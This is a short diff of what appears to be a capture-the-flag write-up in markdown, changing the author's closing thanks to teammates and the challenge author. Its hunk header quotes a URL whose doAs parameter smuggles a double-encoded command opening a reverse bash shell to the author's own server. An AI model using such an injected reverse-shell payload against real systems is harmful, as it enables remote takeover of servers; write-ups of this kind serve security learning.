@@ -434,7 +434,7 @@ http://10.244.0.230:8080/?doAs=%253bbash%2b-i%2b>%2526%2b/dev/tcp/[personal VPS 
 
 ## Finally
 
-> Raf² and all my teammates are GODLIKE!
+> Raf² and all my teammates are GODLIKE!. 
 > RESPECT to Chara, the author of the task! 
 > Looking forward to solve more difficult (and not guessy ofc) challs
 
